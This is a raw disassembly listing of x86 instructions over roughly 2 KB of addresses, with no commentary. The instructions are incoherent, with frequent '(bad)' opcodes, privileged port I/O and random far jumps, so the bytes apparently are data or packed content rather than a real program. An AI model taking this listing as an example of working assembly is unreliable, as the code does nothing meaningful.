  43178a:	or     BYTE PTR [edi],cl
  43178c:	push   0x9c6fd2f5
  431791:	jp     0x43173f
  431793:	les    eax,FWORD PTR [ecx]
  431795:	pop    ecx
  431796:	inc    ecx
  431797:	and    eax,0x6f5566e7
  43179c:	mov    ebp,edx
  43179e:	mov    dh,0x5f
  4317a0:	scas   al,BYTE PTR es:[edi]
  4317a1:	jecxz  0x431790
  4317a3:	add    dl,BYTE PTR ds:0x34b8d606
  4317a9:	sub    dl,BYTE PTR [ecx-0x3b921ced]
  4317af:	sbb    eax,esi
  4317b1:	rcr    DWORD PTR [ebx+0x1b39d630],0x8c
  4317b8:	scas   al,BYTE PTR es:[edi]
  4317b9:	out    dx,al
  4317ba:	outs   dx,DWORD PTR ds:[esi]
  4317bb:	mov    ah,0x58
  4317bd:	loop   0x4317b6
  4317bf:	out    dx,al
  4317c0:	aam    0xa8
  4317c2:	mov    ch,0xb3
  4317c4:	stc    
  4317c5:	and    bh,BYTE PTR [ebp+0x28b3fe3f]
  4317cb:	cmc    
  4317cc:	ins    BYTE PTR es:[edi],dx
  4317cd:	imul   esi,esp,0x7742bf3b
  4317d3:	mov    bh,0x94
  4317d5:	inc    esi
  4317d6:	outs   dx,BYTE PTR ds:[esi]
  4317d7:	into   
  4317d8:	mov    DWORD PTR [eax+0x7b],edi
  4317db:	and    al,0xe1
  4317dd:	bts    DWORD PTR [ebp+0x60],ebp
  4317e1:	(bad)  
  4317e2:	aad    0x87
  4317e4:	xor    cl,bh
  4317e6:	or     al,0x28
  4317e8:	test   BYTE PTR [edx],dh
  4317ea:	and    al,0x49
  4317ec:	adc    ah,BYTE PTR [ebp-0x5df6662d]
  4317f2:	int3   
  4317f3:	inc    eax
  4317f5:	sub    DWORD PTR [ecx+0x23bacfff],ecx
  4317fb:	dec    BYTE PTR [esi+0x1d]
  4317fe:	out    dx,eax
  4317ff:	test   DWORD PTR [edi+0x11a8c9c],edi
  431805:	in     eax,dx
  431806:	push   ebx
  431807:	mov    dh,BYTE PTR [ecx+0x471cfe03]
  43180d:	pop    esp
  43180e:	push   eax
  43180f:	int3   
  431810:	cld    
  431811:	mov    al,ds:0x86466249
  431816:	out    0x4c,al
  431818:	sbb    bh,BYTE PTR [edi+edi*8]
  43181b:	sub    al,dl
  43181d:	mov    al,0x2d
  43181f:	dec    esi
  431820:	les    ecx,FWORD PTR [edx+0x6c]
  431823:	push   ecx
  431824:	adc    ebp,DWORD PTR fs:[ebp-0x4a]
  431828:	fwait
  431829:	sub    BYTE PTR [ecx+0x47fa8902],ch
  43182f:	mov    ch,ah
  431831:	and    al,0x70
  431833:	pop    eax
  431834:	push   ebx
  431835:	ss mov dh,0x54
  431838:	mov    WORD PTR ds:0x8064e6eb,ss
  43183e:	repnz sbb BYTE PTR [esi],ch
  431841:	into   
  431842:	xchg   esp,eax
  431843:	shl    BYTE PTR [ebx-0x7f],cl
  431846:	mov    fs,esp
  431848:	(bad)  [ebx-0x10b97c2d]
  43184e:	fldenv [ebx]
  431850:	int3   
  431851:	pop    ss
  431852:	arpl   WORD PTR [ebp-0x2ad6d8d],ax
  431858:	xchg   esi,eax
  431859:	js     0x4318da
  43185b:	imul   ecx,DWORD PTR fs:[esi],0x46
  43185f:	mov    esp,0x4030f684
  431864:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  431866:	mov    ch,0x7f
  431868:	pop    ebp
  431869:	adc    ch,BYTE PTR [edi+0x51d9b7cb]
  43186f:	mov    ebx,ds
  431871:	out    0xa4,eax
  431873:	in     eax,dx
  431874:	in     eax,dx
  431875:	enter  0x8e3c,0x28
  431879:	sbb    DWORD PTR [eax-0x2c],ecx
  43187c:	xchg   edx,eax
  43187d:	or     BYTE PTR [ecx+0x4098f87f],dl
  431883:	adc    BYTE PTR [esp+ecx*1-0x6ac0445b],ah
  43188a:	repnz mov WORD PTR [esi],fs
  43188d:	sbb    esi,ebx
  43188f:	push   ecx
  431890:	pop    ds
  431891:	or     ebp,ebp
  431893:	dec    ebp
  431894:	leave  
  431895:	pop    edx
  431896:	pop    edx
  431897:	fisub  DWORD PTR [ebx+0x6f]
  43189a:	add    ebx,DWORD PTR [ecx+0x7bf45fc]
  4318a0:	or     al,0xbf
  4318a2:	(bad)  
  4318a3:	fcom   QWORD PTR [edx+0x38]
  4318a6:	pop    ds
  4318a7:	xchg   edx,eax
  4318a8:	fistp  DWORD PTR [edi]
  4318aa:	push   ebp
  4318ab:	mov    ds:0x99dc62b5,al
  4318b0:	xor    DWORD PTR [edi],ebx
  4318b2:	cdq    
  4318b3:	ins    DWORD PTR es:[edi],dx
  4318b4:	test   BYTE PTR ds:0x6c557,dh
  4318ba:	mov    bl,0x37
  4318bc:	sbb    ch,dh
  4318be:	mov    dh,0xb8
  4318c0:	call   0x6a598472
  4318c5:	xor    al,0xb6
  4318c7:	adc    ecx,edi
  4318c9:	out    dx,eax
  4318ca:	nop
  4318cb:	sbb    ch,BYTE PTR [edi]
  4318cd:	mov    bh,0xa9
  4318cf:	je     0x4318c8
  4318d1:	dec    ecx
  4318d2:	ins    DWORD PTR es:[edi],dx
  4318d3:	sub    eax,0x75434c54
  4318d8:	out    0x6a,eax
  4318da:	mov    ds:0x136189cf,al
  4318df:	das    
  4318e0:	test   ebp,edx
  4318e2:	jle    0x43188f
  4318e4:	int3   
  4318e5:	pop    DWORD PTR [ebp-0x1d]
  4318e8:	or     eax,0x89ee4224
  4318ed:	repz push esi
  4318ef:	jo     0x43195f
  4318f1:	iret   
  4318f2:	inc    ebp
  4318f3:	sub    DWORD PTR [ecx+0x4c],ebx
  4318f6:	dec    ebp
  4318f7:	cmp    eax,DWORD PTR gs:[eax-0x11bf1abb]
  4318fe:	add    al,0xa6
  431900:	imul   eax,ebx,0x310b83eb
  431906:	cmp    al,0x95
  431908:	mov    bh,0x86
  43190a:	push   esp
  43190b:	arpl   WORD PTR ds:0x21d28839,cx
  431911:	jg     0x43190c
  431913:	repnz sbb BYTE PTR [ebp-0x2c5bc3ff],0x87
  43191b:	xchg   edi,eax
  43191c:	dec    ecx
  43191d:	mov    bh,0x2f
  43191f:	sub    al,0xa5
  431921:	(bad)  
  431922:	in     al,0x1
  431924:	xor    eax,0xc25ad3cc
  431929:	or     eax,0x58da78f8
  43192e:	xchg   edi,eax
  43192f:	(bad)  
  431930:	ror    eax,cl
  431932:	stos   BYTE PTR es:[edi],al
  431933:	jmp    0x9467cd31
  431938:	xlat   BYTE PTR ds:[ebx]
  431939:	and    cl,BYTE PTR [edi+0x53]
  43193c:	icebp  
  43193d:	es jae 0x43198b
  431940:	xor    eax,0x69663422
  431945:	shr    al,cl
  431947:	pop    esi
  431948:	pop    ds
  431949:	mov    edi,0xc5813240
  43194e:	dec    ecx
  43194f:	aad    0xe4
  431951:	fwait
  431952:	lahf   
  431953:	push   ecx
  431954:	jne    0x431994
  431956:	in     eax,dx
  431957:	imul   eax,DWORD PTR [edi-0x2c],0x3
  43195b:	sti    
  43195c:	scas   eax,DWORD PTR es:[edi]
  43195d:	out    dx,al
  43195e:	push   es
  43195f:	xchg   esp,eax
  431960:	jg     0xbb3a8b33
  431966:	(bad)
  43196a:	lods   eax,DWORD PTR ds:[esi]
  43196b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43196c:	xchg   edi,eax
  43196d:	gs adc eax,0x50b4ae37
  431973:	push   ss
  431974:	es pop ds
  431976:	lods   al,BYTE PTR ds:[esi]
  431977:	mov    esp,0x9b2aeaf
  43197c:	cs mov esp,0x46758f56
  431982:	mov    DWORD PTR [ebx-0x6b],ebp
  431985:	test   DWORD PTR [edx],esp
  431987:	push   ds
  431988:	mov    ecx,0x3b79b40f
  43198d:	xchg   DWORD PTR [ebx+0x2f],esp
  431990:	call   0xaff1985f
  431995:	ins    DWORD PTR es:[edi],dx
  431996:	test   BYTE PTR [edx+0x1e1ae2b9],cl
  43199c:	xchg   esi,eax
  43199d:	dec    esp
  43199e:	call   0xdbb6:0x8864c5f2
  4319a5:	imul   esi,ebp,0x4a40f05c
  4319ab:	pop    edi
  4319ac:	mov    al,ds:0x2f30007f
  4319b1:	in     al,0x94
  4319b3:	in     eax,0xa4
  4319b5:	sar    BYTE PTR [ebp-0x7a],0x9b
  4319b9:	sub    eax,0x979c49eb
  4319be:	mov    ah,0xcf
  4319c0:	and    ecx,DWORD PTR [edx]
  4319c2:	push   edx
  4319c3:	adc    ebx,0x97ad3a56
  4319c9:	xchg   BYTE PTR ds:0xa604a9f9,ch
  4319cf:	jns    0x431998
  4319d1:	push   esp
  4319d2:	xor    BYTE PTR [edi+0x7d],ah
  4319d5:	js     0x431998
  4319d7:	sahf   
  4319d8:	call   0x2b32350e
  4319dd:	sahf   
  4319de:	fs xor eax,0xf38340e4
  4319e4:	mov    ah,BYTE PTR [edx+0x5cd918b7]
  4319ea:	lea    eax,[edx+edx*2+0x7fc37306]
  4319f1:	ret    
  4319f2:	ins    BYTE PTR es:[edi],dx
  4319f3:	lods   eax,DWORD PTR ds:[esi]
  4319f4:	jp     0x4319b9
  4319f6:	mov    al,ds:0x80961d2c
  4319fb:	cmp    eax,0x3a2737aa
  431a00:	sub    ebx,0xe99f3ff6
  431a06:	or     ch,BYTE PTR [edx+0x4d]
  431a09:	mul    BYTE PTR [edi]
  431a0b:	lds    ecx,FWORD PTR [ebx]
  431a0d:	cmp    al,0xa0
  431a0f:	test   al,0x53
  431a11:	add    ecx,ebp
  431a13:	mov    edx,DWORD PTR [eax+esi*8-0x5566b331]
  431a1a:	sahf   
  431a1b:	(bad)  
  431a1c:	std    
  431a1d:	xor    DWORD PTR [ecx-0x3],0xffffffc0
  431a21:	pusha  
  431a22:	(bad)  
  431a24:	mov    ch,0x1c
  431a26:	rcl    BYTE PTR [edx-0x28ffab9d],0xc3
  431a2d:	dec    BYTE PTR [eax+eiz*8-0x4dbbd926]
  431a34:	mov    ecx,0xed13258f
  431a39:	dec    esi
  431a3a:	(bad)  
  431a3b:	in     eax,0xd3
  431a3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431a3e:	fstp   QWORD PTR es:[ebx]
  431a41:	mov    dl,BYTE PTR [esi-0x212e70b7]
  431a47:	sbb    esi,DWORD PTR [edx+0x7401ad7d]
  431a4d:	ret    0x301f
  431a50:	inc    ebx
  431a51:	addr16 jmp 0xabfb:0xd8dcc32f
  431a59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431a5a:	or     edx,ecx
  431a5c:	pop    ss
  431a5d:	lock or BYTE PTR [edx-0x6a6e24a6],dl
  431a64:	ja     0x431a31
  431a66:	add    ebp,DWORD PTR [ecx]
  431a68:	in     eax,dx
  431a69:	adc    ebp,ebx
  431a6b:	fsubr  QWORD PTR [esi]
  431a6d:	and    ch,BYTE PTR [esi]
  431a6f:	jle    0x431a07
  431a71:	jecxz  0x431a5e
  431a73:	arpl   WORD PTR [edi+edx*4],si
  431a76:	add    DWORD PTR [edi+0x75],esi
  431a79:	xchg   BYTE PTR [eax+esi*4],bh
  431a7c:	aas    
  431a7d:	mov    al,dh
  431a7f:	mov    edx,0xc2412ffc
  431a84:	and    bh,BYTE PTR [ebx-0x48a2d113]
  431a8a:	mov    ebp,0xd3a80ea4
  431a90:	bound  ebp,QWORD PTR [ebx]
  431a92:	add    DWORD PTR [ecx],ebp
  431a94:	fidivr WORD PTR [esi+0x2b2187cd]
  431a9a:	dec    ebx
  431a9b:	dec    eax
  431a9c:	mov    ebx,0x54d6a281
  431aa1:	aaa    
  431aa2:	pop    edi
  431aa3:	or     ecx,DWORD PTR [ebx-0x2c02444f]
  431aa9:	push   0x6c
  431aab:	xchg   ebp,eax
  431aac:	retf   0xac16
  431aaf:	cmp    eax,0x310e2fb3
  431ab4:	data16 jge 0x431a50
  431ab7:	xchg   ah,dl
  431ab9:	out    dx,al
  431aba:	pop    ecx
  431abb:	lds    esi,FWORD PTR [edx]
  431abd:	jo     0x431a6d
  431abf:	rcl    BYTE PTR [ebx-0x4f04e124],1
  431ac5:	pop    ds
  431ac6:	test   al,0xb5
  431ac8:	(bad)  
  431ac9:	sbb    al,0x36
  431acb:	sbb    eax,0x7796fb3b
  431ad0:	inc    eax
  431ad1:	imul   ebx,DWORD PTR [eax-0x269e7cc8],0x13
  431ad8:	and    dl,al
  431ada:	lods   al,BYTE PTR ds:[esi]
  431adb:	push   esi
  431adc:	dec    ecx
  431add:	aam    0xc7
  431adf:	ret    
  431ae0:	add    al,0x43
  431ae2:	xchg   esp,eax
  431ae3:	jecxz  0x431a88
  431ae5:	sbb    al,0x7a
  431ae7:	mov    al,ds:0xc81be78a
  431aec:	addr16 test al,0xe0
  431aef:	pusha  
  431af0:	and    ecx,edx
  431af2:	scas   eax,DWORD PTR es:[edi]
  431af3:	outs   dx,BYTE PTR ds:[esi]
  431af4:	inc    edi
  431af5:	mov    bl,0xb2
  431af7:	jae    0x431a89
  431af9:	lahf   
  431afa:	cmp    ch,BYTE PTR [ecx+0x4376d15e]
  431b00:	mov    cl,0xbd
  431b02:	call   0x24289ee5
  431b07:	(bad)  
  431b08:	or     eax,0x96c8ef64
  431b0d:	pop    esi
  431b0e:	mov    al,cs:0x452b86f6
  431b14:	jmp    FWORD PTR [ebp-0x60e48c24]
  431b1a:	fimul  WORD PTR [ecx-0x41099456]
  431b20:	cmc    
  431b21:	jecxz  0x431b47
  431b23:	xchg   DWORD PTR [edi],eax
  431b25:	out    dx,al
  431b26:	jmp    0x431abc
  431b28:	jmp    0xe7fb6042
  431b2d:	rcr    BYTE PTR [ebx],1
  431b2f:	jmp    0xe999:0x42b52ebd
  431b36:	sahf   
  431b37:	jmp    0x431aee
  431b39:	push   0xa15fc11d
  431b3e:	jae    0x431b2b
  431b40:	adc    edx,DWORD PTR [edi-0x5a]
  431b43:	adc    eax,0xa04c7829
  431b48:	sbb    al,0xc2
  431b4a:	pop    ss
  431b4b:	fnsave [ebx]
  431b4d:	mov    DWORD PTR [eax+0x43db7c3f],0xe96e36c5
  431b57:	inc    ebp
  431b58:	(bad)  
  431b5b:	pusha  
  431b5c:	mov    DWORD PTR ds:0xeb5bc747,esp
  431b62:	and    al,0xd9
  431b64:	into   
  431b65:	mov    esi,0xc5c7b396
  431b6a:	jb     0x431bc1
  431b6c:	inc    ebx
  431b6d:	dec    esi
  431b6e:	adc    al,0x3e
  431b70:	mov    eax,ds:0xfbbea1a5
  431b75:	test   DWORD PTR [ecx+0x18],0xa5404b13
  431b7c:	retf   0xd967
  431b7f:	stos   BYTE PTR es:[edi],al
  431b80:	lods   eax,DWORD PTR ds:[esi]
  431b81:	pop    edi
  431b82:	ins    DWORD PTR es:[edi],dx
  431b83:	push   ecx
  431b84:	popf   
  431b85:	scas   eax,DWORD PTR es:[edi]
  431b86:	cmp    DWORD PTR [ebx+ecx*4+0x41155dc],ebx
  431b8d:	sub    al,0xcc
  431b8f:	popf   
  431b90:	adc    DWORD PTR [eax-0x11],esp
  431b93:	(bad)  
  431b94:	fld    DWORD PTR [ebx-0x3c]
  431b97:	stos   BYTE PTR es:[edi],al
  431b98:	mov    ch,ah
  431b9a:	add    eax,ecx
  431b9c:	pop    ebx
  431b9d:	mov    edx,0x1ba63fed
  431ba2:	jp     0x431b69
  431ba4:	push   ds
  431ba5:	les    eax,FWORD PTR [edx+0x43]
  431ba8:	adc    BYTE PTR [ebp+0x5be235e4],al
  431bae:	sbb    DWORD PTR [edx],ecx
  431bb0:	mov    ch,0x81
  431bb2:	lock pop ebx
  431bb4:	sub    DWORD PTR [ebx-0x5cc48bff],esi
  431bba:	or     ah,0xe8
  431bbd:	pop    ss
  431bbe:	es cmp al,0xf0
  431bc1:	sbb    BYTE PTR [ebx],ch
  431bc3:	xchg   ecx,eax
  431bc4:	mov    bl,0xf8
  431bc6:	inc    ebp
  431bc7:	cmp    BYTE PTR [esi+ebx*4],dl
  431bca:	pop    es
  431bcb:	ror    edx,0xf9
  431bce:	inc    ebp
  431bcf:	jl     0x431be9
  431bd1:	pop    esi
  431bd2:	dec    edx
  431bd3:	dec    eax
  431bd4:	out    0xa,al
  431bd6:	mov    ch,0x43
  431bd8:	mov    eax,0x4f7471ee
  431bdd:	aaa    
  431bde:	sti    
  431bdf:	cmp    bh,BYTE PTR ds:0x57608a99
  431be5:	dec    edi
  431be6:	jns    0x431c2c
  431be8:	fcom   QWORD PTR [edi-0xa0c97fb]
  431bee:	xor    BYTE PTR [edx],cl
  431bf0:	jno    0x431bc3
  431bf2:	pop    ebx
  431bf3:	out    0x72,eax
  431bf5:	(bad)  
  431bf7:	or     al,0xf3
  431bf9:	rol    BYTE PTR [ebx-0x7715aab9],cl
  431bff:	aas    
  431c00:	cld    
  431c01:	stos   BYTE PTR es:[edi],al
  431c02:	push   eax
  431c03:	dec    esp
  431c04:	shl    DWORD PTR [edi+0x255e8d2a],cl
  431c0a:	jno    0x431c0e
  431c0c:	xchg   esp,eax
  431c0d:	xchg   edx,eax
  431c0e:	cdq    
  431c0f:	int3   
  431c10:	cmp    al,0x86
  431c12:	push   es
  431c13:	imul   ecx,DWORD PTR [edx+0x7c],0xf50e96c7
  431c1a:	cli    
  431c1b:	lods   al,BYTE PTR fs:[esi]
  431c1d:	cmp    eax,ebp
  431c1f:	xor    esp,DWORD PTR [ecx-0x3c54767]
  431c25:	jg     0x431c78
  431c27:	pop    ds
  431c28:	push   0x69
  431c2a:	fisttp WORD PTR [edi-0x2399fe14]
  431c30:	and    al,0xd6
  431c32:	fistp  QWORD PTR [ebx+ecx*2]
  431c35:	bound  ecx,QWORD PTR [edx+edi*8]
  431c38:	push   ecx
  431c39:	pop    ebp
  431c3a:	loopne 0x431cb7
  431c3c:	rol    BYTE PTR [eax-0x1a],cl
  431c3f:	ret    
  431c40:	icebp  
  431c41:	out    dx,al
  431c42:	sub    ecx,DWORD PTR [ebx-0x6]
  431c45:	push   ebp
  431c46:	mov    BYTE PTR [ebp+0x51470d7f],cl
  431c4c:	retf   
  431c4d:	enter  0x25fe,0x3a
  431c51:	pop    ss
  431c52:	jle    0x431c96
  431c54:	push   cs
  431c55:	cmps   BYTE PTR es:[si],BYTE PTR es:[di]
  431c58:	or     bl,al
  431c5a:	or     eax,0x35cd3625
  431c5f:	sub    BYTE PTR [edx],bh
  431c61:	lods   al,BYTE PTR ds:[esi]
  431c62:	cli    
  431c63:	sti    
  431c64:	push   ebp
  431c65:	pusha  
  431c66:	(bad)  [ecx+0x79034433]
  431c6c:	cmp    eax,0xbb99805d
  431c71:	loopne 0x431c7a
  431c73:	ins    DWORD PTR es:[edi],dx
  431c74:	xor    al,0xeb
  431c76:	aaa    
  431c77:	sar    BYTE PTR [edi+0x5e4c50de],0x50
  431c7e:	ret    
  431c7f:	jp     0x431cb6
  431c81:	leave  
  431c82:	xchg   esp,eax
  431c83:	gs cmc 
  431c85:	add    al,0x8c
  431c87:	sbb    eax,0xa969bb83
  431c8c:	imul   esp,DWORD PTR [ebp-0x8],0x5f
  431c90:	das    
  431c91:	icebp  
  431c92:	push   0x5c
  431c94:	cdq    
  431c95:	cmp    DWORD PTR [ecx],edx
  431c97:	adc    DWORD PTR [ecx],esp
  431c99:	lock add bl,BYTE PTR [esi-0x4b]
  431c9d:	retf   
  431c9e:	add    al,0xad
  431ca0:	sti    
  431ca1:	and    BYTE PTR ds:0x82de123c,ch
  431ca7:	data16 bound sp,DWORD PTR [ecx+0x323e8b32]
  431caf:	cmp    ah,BYTE PTR [ebp+0x78]
  431cb2:	add    DWORD PTR [ebx+edi*4-0x427e73c0],edx
  431cb9:	inc    eax
  431cba:	loope  0x431d2c
  431cbc:	scas   al,BYTE PTR es:[edi]
  431cbd:	dec    ebx
  431cbe:	test   al,0x77
  431cc0:	int    0xbc
  431cc2:	ss ins DWORD PTR es:[edi],dx
  431cc4:	inc    esi
  431cc5:	es ins DWORD PTR es:[edi],dx
  431cc7:	mov    ds:0x5906d52d,eax
  431ccc:	xcrypt-ctr (bad)
  431ccd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431cce:	pop    eax
  431ccf:	sbb    al,0x21
  431cd1:	lods   eax,DWORD PTR ds:[esi]
  431cd2:	(bad)  
  431cd3:	fisub  WORD PTR fs:[edx-0x76d7ddce]
  431cda:	xor    eax,0xc8df3ab4
  431cdf:	inc    esp
  431ce0:	call   0xe839:0xfd5ce839
  431ce7:	lods   al,BYTE PTR ds:[esi]
  431ce8:	add    DWORD PTR [ebp-0x32],esi
  431ceb:	ins    BYTE PTR es:[edi],dx
  431cec:	mov    edi,0xbbf57fea
  431cf1:	sbb    BYTE PTR [ecx],ah
  431cf3:	repz out dx,eax
  431cf5:	cmc    
  431cf6:	sar    ch,0x34
  431cf9:	mov    al,ds:0x2fc70848
  431cfe:	adc    ebx,ebx
  431d00:	int3   
  431d01:	(bad)  
  431d02:	loope  0x431caf
  431d04:	and    eax,0xffca3e96
  431d09:	addr16 cmp edx,ecx
  431d0c:	mov    esi,0x471503d6
  431d11:	jmp    0x278d:0xb8f556ec
  431d18:	adc    ah,BYTE PTR [edi+0x5c8c3079]
  431d1e:	xlat   BYTE PTR ds:[ebx]
  431d1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431d20:	cmp    bh,BYTE PTR [edx]
  431d22:	lods   eax,DWORD PTR ds:[esi]
  431d23:	adc    ch,BYTE PTR [edx-0x1]
  431d26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431d27:	add    ah,BYTE PTR [ecx]
  431d29:	(bad)  
  431d2a:	aad    0xf4
  431d2c:	and    DWORD PTR [edx-0x7525ca66],0x2b
  431d33:	sbb    dl,dh
  431d35:	or     ch,BYTE PTR [esi-0x2a]
  431d38:	jmp    0x431d8f
  431d3a:	retf   
  431d3b:	(bad)  
  431d3c:	cli    
  431d3d:	arpl   WORD PTR [ebp-0x4f],bx
  431d40:	inc    DWORD PTR [ebx+0x6d693274]
  431d46:	push   cs
  431d47:	mov    ?,WORD PTR [edx+0x16e92596]
  431d4d:	je     0x431d4a
  431d4f:	xor    BYTE PTR [ebx],ch
  431d51:	sar    BYTE PTR [ebx-0x3f3ab5e9],0xdf
  431d58:	scas   al,BYTE PTR es:[edi]
  431d59:	inc    ebp
  431d5a:	sbb    eax,0xf572297b
  431d5f:	test   al,0xce
  431d61:	sub    esp,ecx
  431d63:	cld    
  431d64:	leave  
  431d65:	adc    eax,0xa440deef
  431d6a:	hlt    
  431d6b:	ins    BYTE PTR es:[edi],dx
  431d6c:	bound  edi,QWORD PTR [ebx]
  431d6e:	stos   BYTE PTR es:[edi],al
  431d6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431d70:	nop
  431d71:	(bad)  
  431d73:	push   ss
  431d74:	addr16 mov ebx,0x1c9e7296
  431d7a:	mov    bl,0x4e
  431d7c:	mov    esi,0xc4a7afc2
  431d81:	xor    ebx,DWORD PTR [ebp-0x6ed638f4]
  431d87:	bound  ecx,QWORD PTR [ebp-0x782a0ee4]
  431d8d:	xor    DWORD PTR [ebx+0x415200c1],ebp
  431d93:	lods   eax,DWORD PTR ds:[esi]
  431d94:	cmp    eax,0x18bfbb22
  431d99:	jb     0x431da5
  431d9b:	lea    esp,[esi-0x4fcb8408]
  431da1:	xor    eax,0xffed7cf1
  431da6:	lods   al,BYTE PTR ds:[esi]
  431da7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431da8:	jmp    0xf516:0x6dd26433
  431daf:	into   
  431db0:	sbb    ecx,esi
  431db2:	(bad)  
  431db3:	stos   DWORD PTR es:[edi],eax
  431db4:	rcr    DWORD PTR ds:0x4d425a3f,1
  431dba:	xchg   ebx,eax
  431dbb:	test   eax,0x425374af
  431dc0:	js     0x431d54
  431dc2:	cwde   
  431dc3:	clc    
  431dc4:	scas   eax,DWORD PTR es:[edi]
  431dc5:	jle    0x431dc2
  431dc7:	mov    edi,DWORD PTR [ebx+0x57f37ea1]
  431dcd:	iret   
  431dce:	ins    DWORD PTR es:[edi],dx
  431dcf:	mov    eax,ds:0x62c08e57
  431dd4:	jl     0x431e4b
  431dd6:	(bad)  
  431dd7:	outs   dx,BYTE PTR ds:[esi]
  431dd8:	int3   
  431dd9:	jmp    0xdc65ac82
  431dde:	pop    edx
  431ddf:	push   esi
  431de0:	fstp   QWORD PTR [eax-0x6a678e16]
  431de6:	aad    0x4c
  431de8:	mov    dh,BYTE PTR [ebx+0x2e]
  431deb:	xor    bh,BYTE PTR [ecx]
  431ded:	mov    bl,0xd7
  431def:	(bad)  
  431df0:	xlat   BYTE PTR ds:[ebx]
  431df1:	pop    edi
  431df2:	les    ebp,FWORD PTR ds:0xe68fc2ad
  431df8:	push   edx
  431df9:	ss jp  0x431d9e
  431dfc:	ss loope 0x431e3d
  431dff:	mov    ecx,0xa37c7c8c
  431e04:	pop    es
  431e05:	stos   BYTE PTR es:[edi],al
  431e06:	aas    
  431e07:	push   0xdb721d3b
  431e0c:	xor    dl,dl
  431e0e:	xor    DWORD PTR [ebp+0x7e],eax
  431e11:	jmp    0x845c970
  431e16:	push   edx
  431e17:	and    esp,ebx
  431e19:	adc    ch,BYTE PTR ds:0x39f436b5
  431e1f:	or     dl,BYTE PTR [ebp-0x5]
  431e22:	(bad)  
  431e24:	jg     0x431e5f
  431e26:	adc    al,0xc8
  431e28:	xor    esi,ecx
  431e2a:	dec    eax
  431e2b:	push   edi
  431e2c:	push   ds
  431e2d:	(bad)  
  431e2e:	mov    ebp,0x8c835684
  431e33:	in     eax,dx
  431e34:	das    
  431e35:	stc    
  431e36:	mov    es,WORD PTR [ebx+esi*4]
  431e39:	das    
  431e3a:	ins    BYTE PTR es:[edi],dx
  431e3b:	pop    eax
  431e3c:	cmp    DWORD PTR [ecx+0x4d],ecx
  431e3f:	xchg   BYTE PTR [ecx],al
  431e41:	mov    cl,0x9c
  431e43:	and    al,0x47
  431e45:	xor    esp,edi
  431e47:	into   
  431e48:	ret    0xea60
  431e4b:	cmp    eax,0x53ca7af2
  431e50:	lahf   
  431e51:	sbb    BYTE PTR [ecx+eax*1+0x24],dh
  431e55:	pop    ebx
  431e56:	into   
  431e57:	mov    dl,0xfb
  431e59:	fwait
  431e5a:	push   0xffffff9b
  431e5c:	xchg   ebx,eax
  431e5d:	mov    DWORD PTR [ecx+ebp*1-0x2f],edx
  431e61:	adc    dh,al
  431e63:	cmp    edi,edi
  431e65:	retf   0x8022
  431e68:	sub    bl,BYTE PTR [edi+0x7c]
  431e6b:	fistp  QWORD PTR [eax]
  431e6d:	lahf   
  431e6e:	ds out dx,eax
  431e70:	inc    ebp
  431e71:	jbe    0x431eaa
  431e73:	push   ebp
  431e74:	cmp    al,0xbd
  431e76:	mov    ebx,esp
  431e78:	fistp  DWORD PTR [ecx+ebx*1]
  431e7b:	xor    dh,BYTE PTR [esi]
  431e7d:	pop    es
  431e7e:	fwait
  431e7f:	cmp    eax,DWORD PTR [esi-0x26]
  431e82:	and    eax,0xbdc19f2e
  431e87:	push   es
  431e88:	das    
  431e89:	std    
  431e8a:	xor    edx,DWORD PTR [eax]
  431e8c:	mov    ecx,edx
  431e8e:	jge    0x431e59
  431e90:	and    bh,BYTE PTR [edi]
  431e92:	inc    edi
  431e93:	retf   0x736e
  431e96:	add    al,0xa6
  431e98:	inc    ebx
  431e99:	mov    dl,0x55
  431e9b:	pop    edx
  431e9c:	stos   DWORD PTR es:[edi],eax
  431e9d:	das    
  431e9e:	xlat   BYTE PTR ds:[ebx]
  431e9f:	pop    ebx
  431ea0:	or     DWORD PTR [esi-0x75],0xffffff98
  431ea4:	mov    edx,DWORD PTR [ebx]
  431ea6:	out    0xe5,al
  431ea8:	xchg   edx,eax
  431ea9:	or     bl,BYTE PTR [edx-0x65b4f42a]
  431eaf:	xchg   BYTE PTR [eax+ebp*1-0x11],bh
  431eb3:	push   ds
  431eb4:	daa    
  431eb5:	pop    ebx
  431eb6:	sahf   
  431eb7:	in     al,dx
  431eb8:	mov    ecx,0xd4bc92ce
  431ebd:	mov    WORD PTR [edx+0x2b],cs
  431ec0:	sbb    BYTE PTR [ebx-0x54],0xbd
  431ec4:	ror    BYTE PTR [ebp+0x15],1
  431ec7:	or     eax,0xb1ef1eee
  431ecc:	mov    ecx,?
  431ece:	loop   0x431e5a
  431ed0:	mov    esi,DWORD PTR [ebp+0x40f812ca]
  431ed6:	test   ch,bl
  431ed8:	mov    bh,0x5a
  431eda:	sar    BYTE PTR [ecx],1
  431edc:	(bad)  
  431edd:	fst    QWORD PTR [edi+edi*1+0x609ea03f]
  431ee4:	mov    al,cs:0x17b9bef9
  431eea:	(bad)  
  431eec:	inc    edi
  431eed:	sub    dl,BYTE PTR [ebx+0x760aecbc]
  431ef3:	outs   dx,BYTE PTR ds:[esi]
  431ef4:	loopne 0x431f04
  431ef6:	outs   dx,BYTE PTR ds:[esi]
  431ef7:	pop    esi
  431ef8:	mov    DWORD PTR [ecx-0x4c],esp
  431efb:	jne    0x431ecb
  431efd:	call   0x65f81ea
  431f02:	jp     0x431ef9
  431f04:	mov    edi,DWORD PTR [eax+0x2640e8e3]
  431f0a:	pop    esi
  431f0b:	stos   DWORD PTR es:[edi],eax
  431f0c:	jmp    0x2ea5:0x83f1ad83
  431f13:	lea    ecx,[eax-0x74]
  431f16:	xchg   edx,eax
  431f17:	sub    dl,BYTE PTR [esi-0x9]
  431f1a:	cmc    
  431f1b:	add    ch,BYTE PTR [ebp-0x5266094e]
  431f21:	rcr    DWORD PTR [edi+esi*4-0x59],cl
  431f25:	(bad)  
  431f26:	fdiv   QWORD PTR [edi-0x3760158]
  431f2c:	jl     0x431f1a
  431f2e:	jp     0x431f68
  431f30:	sbb    DWORD PTR [ebx+0x4a],ecx
